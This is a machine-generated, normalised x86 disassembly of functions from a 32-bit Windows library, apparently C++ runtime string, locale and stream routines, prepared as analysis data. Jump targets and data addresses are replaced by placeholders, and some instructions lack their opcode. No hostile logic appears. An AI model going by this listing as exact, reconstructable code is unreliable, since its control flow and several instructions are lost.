mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
call sub_10027827
cmp eax [ edi ]
je r-xdata
sub_10006f37
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10027827
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10027827
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10006f6f
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10027160
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
push [ esi + 0x14 ]
push 0x0
call sub_1000702c
pop esi
retn 0x4
sub_10006f91
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_10027160
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10022df7
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_1002260b
add esp 0x14
test eax eax
jle r-xdata
test edi edi
ja r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
inc edi
test ebx ebx
ja r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_1002260b
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
add [ ebp + 0x8 ] eax
dec edi
inc ebx
inc ebx
sub_1000702c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
sub eax edi
cmp eax ebx
jae r-xdata
call sub_10021cfc
mov eax [ ebp + 0x14 ]
cmp ebx eax
jae r-xdata
mov ebx eax
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax ebx
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push eax
push [ ebp + 0x10 ]
add esi edi
push esi
call sub_10027c61
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp ebx [ ebp + 0x14 ]
setne al
or eax 0xffffffff
jmp r-xdata
sub_10007092
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10027827
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi * 2 ]
pop edi
pop esi
retn 0x4
sub_100070ba
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x4 ]
retn
mov eax [ esp + 0x8 ]
movzx edx ax
mov eax edx
shl edx 0x10
push edi
mov edi [ esp + 0x8 ]
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
pop edi
sub_100070e4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x14 ] ebx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jae r-xdata
call sub_10021cfc
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0x10 ] ebx
call sub_10021cc4
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_100024cd
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
lea edi [ edi + ebx * 2 ]
sub eax ecx
push edi
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_10002614
add esp 0x10
push [ ebp + 0x8 ]
mov ecx esi
call sub_10002630
sub_1000718d
push edi
xor edi edi
push edi
push esi
xor ecx ecx
mov [ esi + 0x24 ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] 0x201
mov [ esi + 0x14 ] 0x6
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
call sub_100080a5
push 0x4
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
call sub_1000736c
jmp r-xdata
mov [ esi + 0x24 ] eax
pop edi
retn
sub_100071d5
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_100222d1
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_100071fd
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x14 ] ebx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jae r-xdata
call sub_10021cfc
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0x10 ] ebx
call sub_10021cc4
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1000212d
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
add edi ebx
sub eax ecx
push edi
push eax
add ecx edx
push ecx
call sub_1000218b
add esp 0x10
push [ ebp + 0x8 ]
mov ecx esi
call sub_100021a7
sub_100072a4
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10001df2
test al al
je r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_10021cc4
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
push edi
push esi
mov ecx esi
call sub_100071fd
jmp r-xdata
mov eax esi
pop ebx
mov edi [ esi + 0x14 ]
push 0x0
add edi ebx
push edi
mov ecx esi
call sub_1000212d
test al al
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
push ebx
push [ ebp + 0x8 ]
sub eax ecx
push eax
add ecx edx
push ecx
call sub_1000218b
add esp 0x10
push edi
mov ecx esi
call sub_100021a7
sub_10007340
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1002260b
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_100073a2
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp + 0x10 ] esi
jge r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] ax
inc ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0x10 ]
push esi
push [ eax ]
push [ ebp + 0xc ]
push ebx
call sub_10002614
mov eax [ edi + 0x30 ]
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0x10 ] esi
lea ecx [ esi + esi ]
add esp 0x10
add ebx ecx
add [ eax ] ecx
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ edi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
sub_1000742a
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor ecx ecx
mov ecx [ edi + 0x34 ]
mov ecx [ ecx ]
jmp r-xdata
movzx eax [ ebx ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp + 0xc ] ecx
mov esi ecx
jge r-xdata
test ecx ecx
jle r-xdata
pop esi
pop ebx
inc ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
push esi
push ebx
push ecx
push [ eax ]
call sub_10002614
mov eax [ edi + 0x34 ]
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
lea ecx [ esi + esi ]
add esp 0x10
add ebx ecx
add [ eax ] ecx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_100074cf
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_10021d53
mov ecx edi
call sub_10007dbd
push edi
call sub_100272e8
pop ecx
sub_100074f8
push esi
lea esi [ ecx - 0x4 ]
lea eax [ esi + 0x4 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x4 ] r--data
push eax
mov [ eax ] r--data
call sub_10021dee
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000752e
push esi
lea esi [ ecx - 0x8 ]
lea eax [ esi + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_10021dee
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10007573
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
leave
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10021e84
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_10021eac
inc [ rw-data ]
mov eax [ rw-data ]
mov [ esi ] eax
sub_100075a8
mov ecx [ ecx ]
push esi
mov esi [ esp + 0x8 ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
pop esi
retn 0x4
cmp [ ecx + 0x14 ] al
je r-xdata
test eax eax
jne r-xdata
call sub_10021fbc
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov eax [ eax + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
sub_10007636
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ esp + 0x10 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
inc esi
inc esi
sub_10007662
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ esp + 0x10 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
inc esi
inc esi
sub_1000768e
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100227ec
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_100076cd
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1002277f
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_1000772d
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1002260b
add esp 0x14
test eax eax
mov eax 0xffff
jl r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_10007761
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
mov ebx ecx
cmp [ ebp + 0x14 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10027827
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_1000772d
mov [ edi ] ax
inc esi
inc edi
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_100077a2
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
sar edx 0x1
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
pop ebp
retn 0x10
sub_100077c8
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
mov eax ecx
add eax 0x18
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_100222d1
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_1000780e
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
mov ebx ecx
cmp [ ebp + 0x18 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10027827
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_100077c8
inc esi
inc esi
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10007853
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1002247b
mov esi eax
mov eax [ ebp + 0x8 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x4
sub_10007889
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10007853
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_10022358
pop edi
pop esi
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
pop ebx
leave
retn 0x4
sub_100078da
push 0x4
mov eax sub_1004fc97
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
push 0x0
call sub_10021e84
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x4 ]
call sub_100082a7
lea ecx [ esi + 0x20 ]
call sub_100082a7
lea ecx [ esi + 0x3c ]
call sub_100082a7
lea ecx [ esi + 0x58 ]
call sub_100082a7
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x4
push esi
call sub_10022275
pop ecx
pop ecx
mov eax esi
call sub_1002b37e
retn 0x4
sub_1000794c
push 0x4
mov eax sub_1004fc97
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_100220bf
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x58 ]
call sub_100020e2
push 0x0
push 0x1
lea ecx [ esi + 0x3c ]
call sub_100020e2
push 0x0
push 0x1
lea ecx [ esi + 0x20 ]
call sub_100020e2
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_100020e2
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_10021eac
call sub_1002b37e
retn
sub_100079ac
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x20
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_100078bb
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10007a4d
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100079ac
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10007aea
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
mov ecx 0xffff
mov edx ecx
cmp dx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
mov eax ecx
pop esi
retn
sub_10007b16
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x14 ]
movzx eax ax
retn
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_10007b4d
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
movzx eax ax
retn
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_10007b71
mov ecx [ esi + 0x20 ]
xor eax eax
cmp [ ecx ] eax
je r-xdata
cmp eax 0x1
jle r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax ]
mov ecx esi
call sub_10007b16
mov ecx 0xffff
mov edx ecx
cmp dx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
add [ eax ] 0x2
mov eax [ esi + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
retn
mov ecx esi
call sub_10007b4d
movzx eax ax
retn
mov eax ecx
retn
sub_10007bd6
push 0x8
mov eax sub_10051d7b
call sub_1002b2d9
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
push 0x0
push eax
call sub_100080a5
xor al al
or ecx 0x4
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x10 ]
test cl 0x1
je r-xdata
mov ecx eax
call sub_100081e0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
push eax
call sub_10007a4d
pop ecx
lea ecx [ ebp - 0x14 ]
mov ebx eax
call sub_10007dbd
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
call sub_10007b4d
mov al 0x1
jmp r-xdata
mov edx [ ebx ]
push eax
push 0x48
mov ecx ebx
call [ edx + 0x8 ]
test al al
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
or ecx 0x1
cmp [ eax + 0x28 ] 0x0
jne r-xdata
call sub_1002b37e
retn 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov esi [ eax + edi + 0x28 ]
call sub_10007b71
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
push eax
call sub_100080a5
jmp r-xdata
or ecx 0x4
movzx eax ax
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_10007ca3
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
or ecx 0x4
sub_10007d03
push 0x4
mov eax sub_10052039
call sub_1002b2a6
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_10007bd6
mov [ esi + 0x4 ] al
mov eax esi
call sub_1002b37e
retn 0x8
lea ecx [ eax + 0x4 ]
call sub_10021d6a
sub_10007d44
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10021e84
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_10021eac
pop esi
leave
retn
inc eax
mov [ esi + 0x4 ] eax
sub_10007d82
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10021e84
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_10021eac
pop edi
mov eax esi
pop esi
leave
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_10007de8
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10027827
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp ebx eax
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
sub_10007e38
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
mov ecx [ esp + 0x8 ]
push eax
call sub_10007de8
mov eax [ esp + 0x4 ]
retn 0x4
sub_10007e5e
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_10021dee
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10007e90
push 0x0
mov eax sub_10051af7
call sub_1002b2a6
mov edi [ ebp + 0x8 ]
mov [ edi ] esi
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x28 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea ecx [ eax + 0x4 ]
call sub_10021d6a
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0x8 ] 0x0
sete al
mov [ edi + 0x4 ] al
mov eax edi
call sub_1002b37e
retn 0x4
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
mov ecx eax
call sub_100081e0
sub_10007f1c
push 0x0
mov eax sub_10051af7
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call j_sub_1002b64c
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_10007eef
call sub_1002b37e
retn 0x4
lea ecx [ eax + 0x4 ]
